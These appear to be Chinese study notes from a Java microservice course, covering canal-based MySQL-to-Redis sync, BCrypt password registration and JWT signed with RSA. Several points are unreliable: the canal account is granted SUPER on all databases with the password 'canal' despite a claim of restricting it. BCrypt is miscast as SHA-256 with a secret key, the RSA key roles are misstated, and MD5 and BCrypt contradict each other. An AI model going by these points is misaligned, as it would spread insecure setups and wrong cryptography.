<p>当前的 canal 支持源端 MySQL 版本包括 5.1.x , 5.5.x , 5.6.x , 5.7.x , 8.0.x</p>
<p>在GitHub的地址：<a href="https://github.com/alibaba/canal">https://github.com/alibaba/canal</a></p>
<p>基本原理如下图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022666.png" alt="image-20200311220739591"></p>
<p>MySQL主备复制原理</p>
<ul>
<li>MySQL master 将<strong>数据变更</strong>写入二进制日志( binary log, 其中记录叫做二进制日志事件binary log events，可以通过 show binlog events 进行查看)</li>
<li>MySQL slave 将 master 的 binary log events 拷贝到它的中继日志(relay log)</li>
<li>MySQL slave 重放 relay log 中事件，将数据变更反映它自己的数据</li>
</ul>
<p>canal 工作原理</p>
<ul>
<li>canal 模拟 MySQL slave 的交互协议，伪装自己为 MySQL slave ，向 MySQL master 发送dump 协议</li>
<li>MySQL master 收到 dump 请求，开始推送 binary log 给 slave (即 canal )</li>
<li>canal 解析 binary log 对象(原始为 byte 流)</li>
</ul>
<h3 id="设置主从同步"><a href="#设置主从同步" class="headerlink" title="设置主从同步"></a>设置主从同步</h3><p>下面我们就开启mysql的主从同步机制，让Canal来模拟salve</p>
<p>这里以linux版本的mysql为例</p>
<h4 id="设置binary-log"><a href="#设置binary-log" class="headerlink" title="设置binary log"></a>设置binary log</h4><p>根据上面介绍的原理，我们首先要开启mysql的binary log日志。</p>
<p>打开mysql容器挂载的日志文件，我的在<code>/home/leyou/mysql/conf</code>目录:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022667.png" alt="image-20200311221433314"> </p>
<p>修改文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /home/leyou/mysql/conf/my.cnf</span><br></pre></td></tr></table></figure>

<p>添加内容：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">log-bin</span>=/var/lib/mysql/mysql-bin</span><br><span class="line"><span class="attr">server-id</span>=<span class="number">188</span></span><br><span class="line"><span class="attr">binlog-do-db</span>=heima</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022668.png" alt="image-20200311223153680"></p>
<p>如果是windows版本，修改的是data目录下的my.ini文件</p>
<p>配置解读：</p>
<ul>
<li><code>log-bin=/var/lib/mysql/mysql-bin</code>：设置binary log文件的存放地址</li>
<li><code>server-id=88</code>：设置当前服务id</li>
<li><code>binlog-do-db=heima</code>：设置生成binary log的database名称，这里设置的是heima</li>
</ul>
<h4 id="设置账号权限"><a href="#设置账号权限" class="headerlink" title="设置账号权限"></a>设置账号权限</h4><p>接下来添加一个仅用于数据同步的账户，出于安全考虑，这里仅提供对heima这个库的操作权限。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user canal@&#x27;%&#x27; IDENTIFIED by &#x27;canal&#x27;;</span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT,SUPER ON *.* TO &#x27;canal&#x27;@&#x27;%&#x27; identified by &#x27;canal&#x27;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>重启mysql容器即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart mysql</span><br></pre></td></tr></table></figure>



<p>测试设置是否成功：在mysql控制台，或者Navicat中，输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show master status;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022669.png" alt="image-20200327094735948"> </p>
<h4 id="安装canal"><a href="#安装canal" class="headerlink" title="安装canal"></a>安装canal</h4><p>拉取镜像：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull canal/canal-server</span><br></pre></td></tr></table></figure>

<p>运行容器：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 11111:11111 --name canal \</span><br><span class="line">-e canal.destinations=<span class="built_in">test</span> \</span><br><span class="line">-e canal.instance.master.address=172.17.0.3:3306  \</span><br><span class="line">-e canal.instance.dbUsername=canal  \</span><br><span class="line">-e canal.instance.dbPassword=canal  \</span><br><span class="line">-e canal.instance.connectionCharset=UTF-8 \</span><br><span class="line">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span><br><span class="line">-e canal.instance.gtidon=<span class="literal">false</span>  \</span><br><span class="line">-e canal.instance.filter.regex=heima.tb_spu,heima.tb_sku,heima.tb_spu_detail,heima.tb_category,heima.tb_brand,heima.tb_spec_param \</span><br><span class="line">-d canal/canal-server</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -p 11111:11111 --name canal \</span><br><span class="line">-e canal.destinations=<span class="built_in">test</span> \</span><br><span class="line">-e canal.instance.master.address=172.17.0.3:3306  \</span><br><span class="line">-e canal.instance.dbUsername=canal  \</span><br><span class="line">-e canal.instance.dbPassword=canal  \</span><br><span class="line">-e canal.instance.connectionCharset=UTF-8 \</span><br><span class="line">-e canal.instance.tsdb.enable=<span class="literal">true</span> \</span><br><span class="line">-e canal.instance.gtidon=<span class="literal">false</span>  \</span><br><span class="line">-e canal.instance.filter.regex=.* \</span><br><span class="line">-d canal/canal-server</span><br></pre></td></tr></table></figure>



<p>说明:</p>
<ul>
<li><code>-p 11111:11111</code>：这是canal的默认监听端口</li>
<li><code>-e canal.instance.master.address=172.17.0.3:3306</code>：数据库地址和端口，如果不知道mysql容器地址，可以通过<code>docker inspect 容器id</code>来查看</li>
<li><code>-e canal.instance.dbUsername=canal</code>：数据库用户名</li>
<li><code>-e canal.instance.dbPassword=canal</code> ：数据库密码</li>
<li><code>-e canal.instance.filter.regex=</code>：要监听的表名称</li>
</ul>
<p>表名称监听支持的语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql 数据解析关注的表，Perl正则表达式.</span><br><span class="line">多个正则之间以逗号(,)分隔，转义符需要双斜杠(\\) </span><br><span class="line">常见例子：</span><br><span class="line">1.  所有表：.*   or  .*\\..*</span><br><span class="line">2.  canal schema下所有表： canal\\..*</span><br><span class="line">3.  canal下的以canal打头的表：canal\\.canal.*</span><br><span class="line">4.  canal schema下的一张表：canal.test1</span><br><span class="line">5.  多个规则组合使用然后以逗号隔开：canal\\..*,mysql.test1,mysql.test2 </span><br></pre></td></tr></table></figure>

<p>设置canal的自动启动：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker update --restart=always canal</span><br></pre></td></tr></table></figure>



<p>现在，canal就会去监听我们的数据库变化，并通知canal客户端。</p>
<h3 id="编写canal客户端"><a href="#编写canal客户端" class="headerlink" title="编写canal客户端"></a>编写canal客户端</h3><p>我们在<code>ly-page</code>中配置canal客户端，当数据库变化时我们就能得到通知。</p>
<h4 id="引入依赖-1"><a href="#引入依赖-1" class="headerlink" title="引入依赖"></a>引入依赖</h4><p>在<code>ly-page</code>的<code>pom.xml</code>中添加依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>top.javatool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1-RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写<code>ly-page</code>的配置文件<code>application.yml</code>，指定canal服务端地址：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="comment"># top.javatool.canal: warn # 关闭心跳日志</span></span><br><span class="line">    <span class="attr">com.leyou:</span> <span class="string">debug</span> <span class="comment"># 日志配置</span></span><br><span class="line"><span class="attr">canal:</span></span><br><span class="line">  <span class="attr">destination:</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">server:</span> <span class="string">ly-canal:11111</span> <span class="comment"># canal地址</span></span><br></pre></td></tr></table></figure>



<h4 id="添加Redis操作方法"><a href="#添加Redis操作方法" class="headerlink" title="添加Redis操作方法"></a>添加Redis操作方法</h4><p>等会监听到表的操作包括：增、删、改</p>
<ul>
<li>增、改：我们写入数据到redis</li>
<li>删：我们把数据从redis删除</li>
</ul>
<p>这里要监听的数据比较多，业务代码较多，我们以sku为例来给大家介绍。</p>
<p>给<code>ly-page</code>中的<code>GoodsPageService</code>中添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 把Sku从Redis删除</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span>;</span><br></pre></td></tr></table></figure>

<p>然后在<code>GoodsPageServiceImpl</code>中实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Boolean <span class="title function_">deleteSku</span><span class="params">(Long spuId)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> redisTemplate.delete(KEY_PREFIX_SKU + spuId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="编写监听器"><a href="#编写监听器" class="headerlink" title="编写监听器"></a>编写监听器</h4><p>我们在ly-page的<code>com.leyou.page.canal</code>包下，新增一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.page.canal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.page.service.GoodsPageService;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.annotation.CanalTable;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.context.CanalContext;</span><br><span class="line"><span class="keyword">import</span> top.javatool.canal.client.handler.EntryHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@CanalTable(value = &quot;all&quot;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CanalHandler</span> <span class="keyword">implements</span> <span class="title class_">EntryHandler</span>&lt;Map&lt;String,String&gt;&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> GoodsPageService goodsPageService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取表的名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="comment">// 如果表是tb_sku</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku新增了&#123;&#125;&quot;</span>, model);</span><br><span class="line">            goodsPageService.loadSkuListData(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Map&lt;String,String&gt; before, Map&lt;String,String&gt; after)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku修改了&#123;&#125;&quot;</span>, after);</span><br><span class="line">            goodsPageService.loadSkuListData(Long.valueOf(after.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(Map&lt;String,String&gt; model)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">table</span> <span class="operator">=</span> CanalContext.getModel().getTable();</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;tb_sku&quot;</span>.equals(table))&#123;</span><br><span class="line">            log.info(<span class="string">&quot;sku删除了&#123;&#125;&quot;</span>, model);</span><br><span class="line">            goodsPageService.deleteSku(Long.valueOf(model.get(<span class="string">&quot;spu_id&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>密码加密：</p>
<p>密码加密使用传统的MD5加密并不安全，这里我们使用的是Spring提供的BCryptPasswordEncoder加密算法，分成加密和验证两个过程：</p>
<ul>
<li><p>加密：算法会对明文密码随机生成一个salt，使用salt结合密码来加密，得到最终的密文。</p>
</li>
<li><p>验证密码：需要先拿到加密后的密码和要验证的密码，根据已加密的密码来推测出salt，然后利用相同的算法和salt对要验证码的密码加密，与已加密的密码对比即可。</p>
</li>
</ul>
<p>为了防止有人能根据密文推测出salt，我们需要在使用BCryptPasswordEncoder时配置随即密钥</p>
<h1 id="用户中心"><a href="#用户中心" class="headerlink" title="用户中心"></a>用户中心</h1><h2 id="短信服务"><a href="#短信服务" class="headerlink" title="短信服务"></a>短信服务</h2><p>在以前，我们都是把发送短信功能抽取一个工具类，任何地方需要，直接调用工具类发送短信即可。这样的方式存在以下缺点：</p>
<ul>
<li>发送短信代码与业务代码耦合</li>
<li>短信发送功能会影响业务功能执行</li>
</ul>
<p>如果在业务代码中，嵌入发送短信的代码，那就是功能的耦合，不方便后期的维护。而且</p>
<p>因为短信发送是调用第三方的云服务，API调用成功与否、执行时长都是不确定的。如果执行发短信时，因为网络问题导致阻塞，那么我们自己的业务也会阻塞。</p>
<p>为了解决上述问题，提高程序的响应速度，短信发送我们都将采用异步发送方式，即：</p>
<ul>
<li>短信服务监听MQ消息</li>
<li>收到消息后发送短信，根据消息<code>routing_key</code>不同，发送不同类型的短信</li>
<li>其它服务要发送短信时，通过MQ通知短信微服务。</li>
</ul>
<h2 id="发送短信功能"><a href="#发送短信功能" class="headerlink" title="发送短信功能"></a>发送短信功能</h2><p>业务逻辑：</p>
<ul>
<li>1）我们接收页面发送来的手机号码</li>
<li>2）生成一个随机验证码</li>
<li>3）将验证码保存在服务端（要用redis代替session）(验证码有一定有效期，一般是5分钟，我们可以利用Redis的过期机制来保存。)</li>
<li>4）发送短信，将验证码发送到用户手机（向MQ发送消息）</li>
</ul>
<h2 id="注册功能"><a href="#注册功能" class="headerlink" title="注册功能"></a>注册功能</h2><p>用户页面填写数据，发送表单到服务端，服务端对用户输入的短信验证码进行校验，对用户数据做校验，另外还需要对用户密码进行加密存储，使用MD5加密，加密过程中使用随机码作为salt加盐，步骤如下：</p>
<ul>
<li>验证短信验证码</li>
<li>校验用户数据(前端验证不安全,可以通过postman提交)</li>
<li>对密码加密</li>
<li>写入数据库</li>
</ul>
<p>201注册成功, 400参数有误,500服务器内部异常,注册失败</p>
<h3 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h3><p>基本逻辑：</p>
<ul>
<li>1）校验短信验证码</li>
<li>2）对密码加密</li>
<li>3）写入数据库</li>
</ul>
<p>密码加密：</p>
<p>密码加密使用传统的MD5加密并不安全，这里我们使用的是Spring提供的BCryptPasswordEncoder加密算法，分成加密和验证两个过程：</p>
<ul>
<li><p>加密：算法会对明文密码随机生成一个salt，使用salt结合密码来加密，得到最终的密文。</p>
</li>
<li><p>验证密码：需要先拿到加密后的密码和要验证的密码，根据已加密的密码来推测出salt，然后利用相同的算法和salt对要验证码的密码加密，与已加密的密码对比即可。</p>
</li>
</ul>
<p>为了防止有人能根据密文推测出salt，我们需要在使用BCryptPasswordEncoder时配置随机密钥，在<code>com.leyou.user.config</code>包中创建一个配置类，注册<code>BCryptPasswordEncoder</code>对象</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">encoder:</span></span><br><span class="line">    <span class="attr">crypt:</span></span><br><span class="line">      <span class="attr">secret:</span> <span class="string">$&#123;random.uuid&#125;</span> <span class="comment"># 随机的密钥，使用uuid</span></span><br><span class="line">      <span class="attr">strength:</span> <span class="number">6</span> <span class="comment"># 加密强度4~31，决定盐加密时的运算强度，超过10以后加密耗时会显著增加</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(User user, String code)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.校验验证码</span></span><br><span class="line">    <span class="comment">// 1.1 取出redis中的验证码</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheCode</span> <span class="operator">=</span> redisTemplate.opsForValue().get(KEY_PREFIX + user.getPhone());</span><br><span class="line">    <span class="comment">// 1.2 比较验证码</span></span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(code, cacheCode)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;验证码错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.对密码加密</span></span><br><span class="line">    user.setPassword(passwordEncoder.encode(user.getPassword()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.写入数据库</span></span><br><span class="line">    save(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="为什么用MD5不安全"><a href="#为什么用MD5不安全" class="headerlink" title="为什么用MD5不安全?"></a>为什么用MD5不安全?</h4><p>MD5加密可以查表;</p>
<h4 id="BCryptPasswordEncoder的原理"><a href="#BCryptPasswordEncoder的原理" class="headerlink" title="BCryptPasswordEncoder的原理"></a>BCryptPasswordEncoder的原理</h4><p>SHA-256 +随机盐+密钥对密码进行加密,过程是不可以逆的; 加密(encode): 算出hash然后存取数据库,算法不可逆,密码强度超过10会变慢;  密码匹配(matches): 验证密码和hash有没有问题,然后通过存入数据库的hash计算出salt,然后再去加密比对;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022670.png" alt="image.png"></p>
<h2 id="服务端数据校验"><a href="#服务端数据校验" class="headerlink" title="服务端数据校验"></a>服务端数据校验</h2><p>使用Hibernate-Validator(用注解的方式@Email @Pattern(value) 等)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; “用户名格式不正确”)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; “密码格式不正确”)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.PHONE_REGEX, message &#x3D; “手机号格式不正确”)</p>
<h2 id="根据用户名和密码查询用户"><a href="#根据用户名和密码查询用户" class="headerlink" title="根据用户名和密码查询用户"></a>根据用户名和密码查询用户</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> UserDTO <span class="title function_">queryUserByPhoneAndPassword</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.根据用户名查询</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> getOne(<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;User&gt;().eq(<span class="string">&quot;username&quot;</span>, username));</span><br><span class="line">    <span class="comment">// 2.判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户名错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.校验密码</span></span><br><span class="line">    <span class="keyword">if</span>(!passwordEncoder.matches(password, user.getPassword()))&#123;</span><br><span class="line">        <span class="comment">// 密码错误</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.转换DTO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserDTO</span>(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JWT登录01"><a href="#JWT登录01" class="headerlink" title="JWT登录01"></a>JWT登录01</h1><h2 id="无状态登录原理"><a href="#无状态登录原理" class="headerlink" title="无状态登录原理"></a>无状态登录原理</h2><h3 id="什么是有状态"><a href="#什么是有状态" class="headerlink" title="什么是有状态"></a>什么是有状态</h3><p>有状态服务，即服务端需要记录每次会话的客户端信息，从而识别客户端身份，根据用户身份进行请求的处理，典型的设计如tomcat中的session。</p>
<p>例如登录：用户登录后，我们把登录者的信息保存在服务端session中，并且给用户一个cookie值，记录对应的session。然后下次请求，用户携带cookie值来，我们就能识别到对应session，从而找到用户的信息。</p>
<p>缺点是什么？</p>
<ul>
<li>服务端保存大量数据，增加服务端压力</li>
<li>服务端保存用户状态，无法进行水平扩展</li>
<li>客户端请求依赖服务端，多次请求必须访问同一台服务器</li>
</ul>
<h3 id="什么是无状态"><a href="#什么是无状态" class="headerlink" title="什么是无状态"></a>什么是无状态</h3><p>微服务集群中的每个服务，对外提供的都是Rest风格的接口。而Rest风格的一个最重要的规范就是：服务的无状态性，即：</p>
<ul>
<li>服务端不保存任何客户端请求者信息</li>
<li>客户端的每次请求必须具备自描述信息，通过这些信息识别客户端身份</li>
</ul>
<p>带来的好处是什么呢？</p>
<ul>
<li>客户端请求不依赖服务端的信息，任何多次请求不需要必须访问到同一台服务</li>
<li>服务端的集群和状态对客户端透明</li>
<li>服务端可以任意的迁移和伸缩</li>
<li>减小服务端存储压力</li>
</ul>
<h3 id="如何实现无状态"><a href="#如何实现无状态" class="headerlink" title="如何实现无状态"></a>如何实现无状态</h3><p>无状态登录的流程：</p>
<ul>
<li>当客户端第一次请求服务时，服务端对用户进行信息认证（登录）</li>
<li>认证通过，将用户信息进行加密形成token，返回给客户端，作为登录凭证</li>
<li>以后每次请求，客户端都携带认证的token</li>
<li>服务的对token进行解密，判断是否有效。</li>
</ul>
<p>流程图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022671.png" alt="1527300483893"></p>
<p>整个登录过程中，最关键的点是什么？</p>
<p><strong>token(twoken)的安全性</strong></p>
<p>token是识别客户端身份的唯一标示，如果加密不够严密，被人伪造那就完蛋了。</p>
<p>采用何种方式加密才是安全可靠的呢？</p>
<p>我们将采用<code>JWT + RSA非对称加密</code></p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWT，全称是Json Web Token， 是JSON风格轻量级的授权和身份认证规范，可实现无状态、分布式的Web应用授权；</p>
<h4 id="数据格式"><a href="#数据格式" class="headerlink" title="数据格式"></a>数据格式</h4><p>JWT包含三部分数据：</p>
<ul>
<li><p>Header：头部，通常头部有两部分信息：</p>
<ul>
<li>token类型，这里是JWT</li>
<li>签名算法，自定义</li>
</ul>
<p>我们会对头部进行base64加密（可解密），得到第一部分数据</p>
</li>
<li><p>Payload：载荷，就是有效数据，一般包含下面信息：</p>
<ul>
<li>标准载荷：JWT规定的信息，jwt的元数据：<ul>
<li>JTI: JWT的id，当前jwt的唯一标识（像身份证号）</li>
<li>IAT:  issue at 签发时间 </li>
<li>EXP：过期时间</li>
<li>SUB：签发人</li>
<li>…</li>
</ul>
</li>
<li>自定义载荷：<ul>
<li>用户身份信息，（注意，这里因为采用base64加密，可解密，因此不要存放敏感信息）</li>
</ul>
</li>
</ul>
<p>这部分也会采用base64加密，得到第二部分数据</p>
</li>
<li><p>Signature：签名，是整个数据的认证信息。一般根据前两步的数据，再加上服务的的密钥（secret）（不要泄漏，最好周期性更换），通过加密算法生成。用于验证整个数据完整和可靠性</p>
</li>
</ul>
<p>生成的数据格式：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022672.png" alt="1527322512370"></p>
<p>可以看到分为3段，每段就是上面的一部分数据</p>
<h4 id="JWT交互流程"><a href="#JWT交互流程" class="headerlink" title="JWT交互流程"></a>JWT交互流程</h4><p>流程图：</p>
<p>authorize –&gt; authorization 授权（登录）</p>
<p>authenticate –&gt; authentication 鉴权</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022673.png" alt="1554558044477"></p>
<ul>
<li>授权流程authorize：<ul>
<li>1、用户请求登录，携带用户名密码到授权中心</li>
<li>2、授权中心携带用户名密码，到用户中心查询用户</li>
<li>3、查询如果正确，生成JWT凭证</li>
<li>4、返回JWT给用户</li>
</ul>
</li>
<li>鉴权流程authenticate：<ul>
<li>1、用户请求某微服务功能，携带JWT</li>
<li>2、微服务将jwt交给授权中心校验</li>
<li>3、授权中心返回校验结果到微服务</li>
<li>4、微服务判断校验结果，成功或失败</li>
<li>5、失败则直接返回401</li>
<li>6、成功则处理业务并返回</li>
</ul>
</li>
</ul>
<p>因为JWT签发的token中已经包含了用户的信息，并且每次请求都会携带，这样服务就无需保存用户信息，甚至无需去数据库查询，完全符合了Rest的无状态规范。</p>
<p>不过，这个过程是不是就完美了呢？</p>
<p>可以发现，用户访问我们的网站，一次授权后，以后访问微服务都需要鉴权，那么<strong>每次鉴权都需要访问授权中心</strong>，一个用户请求，被分解为2次请求才能完成，效率比较低。</p>
<p>能不能直接在微服务的完成鉴权，不去找授权中心呢？</p>
<p>如果这样，就可以减少一次网络请求，效率提高了一倍。但是，**<code>微服务并没有鉴定JWT的能力</code>**，因为鉴定需要通过密钥来完成。我们不能把密钥(HMAC with SHA-256)交给其它微服务，存在安全风险。</p>
<p>怎么办？</p>
<p>这就要用到RSA非对称加密技术了。</p>
<h3 id="非对称加密验签"><a href="#非对称加密验签" class="headerlink" title="非对称加密验签"></a>非对称加密验签</h3><h4 id="加密技术的类型"><a href="#加密技术的类型" class="headerlink" title="加密技术的类型"></a>加密技术的类型</h4><p>加密技术是对信息进行编码和解码的技术，编码是把原来可读信息（又称明文）译成代码形式（又称密文），其逆过程就是解码（解密），加密技术的要点是加密算法，加密算法可以分为三类：  </p>
<ul>
<li>对称加密，如AES<ul>
<li>基本原理：将明文分成N个组，然后使用密钥对各个组进行加密，形成各自的密文，最后把所有的分组密文进行合并，形成最终的密文。</li>
<li>优势：算法公开、计算量小、加密速度快、加密效率高</li>
<li>缺陷：双方都使用同样密钥，安全性得不到保证</li>
</ul>
</li>
<li>非对称加密，如RSA<ul>
<li>基本原理：同时生成两把密钥：私钥和公钥，私钥隐秘保存，公钥可以下发给信任客户端<ul>
<li>私钥可以解密公钥或私钥加密的数据</li>
<li>公钥只能解密私钥加密的数据</li>
</ul>
</li>
<li>优点：安全，难以破解</li>
<li>缺点：算法比较耗时</li>
</ul>
</li>
</ul>
<p>哈希运算（不可逆加密）：如MD5，SHA</p>
<ul>
<li><p>基本原理：加密过程中不需要使用<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>，输入明文后由系统直接经过加密算法处理成密文，这种加密后的数据是无法被解密的，无法根据密文推算出明文。</p>
</li>
<li><p>作用：验证数据一致性</p>
</li>
</ul>
<p>RSA算法历史：</p>
<p>1977年，三位数学家Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字缩写：RSA</p>
<h4 id="非对称加密验签-1"><a href="#非对称加密验签-1" class="headerlink" title="非对称加密验签"></a>非对称加密验签</h4><p>有了非对称加密，我们就可以改变签名和验签的方式了：</p>
<ul>
<li><p>生成RSA密钥对，私钥存放在授权中心，公钥下发给微服务</p>
</li>
<li><p>在授权中心利用私钥对JWT签名</p>
</li>
<li><p>在微服务利用公钥验证签名有效性</p>
</li>
</ul>
<p>因为非对称加密的特性，不用担心公钥泄漏问题，因为公钥是无法伪造签名的，但要<strong>确保私钥的安全和隐秘</strong>。</p>
<p>非对称加密后的授权和鉴权流程：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022674.png" alt="image-20200223120858510"></p>
<p>鉴权部分简化了非常多：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022675.png" alt="image-20200223121322236"> </p>
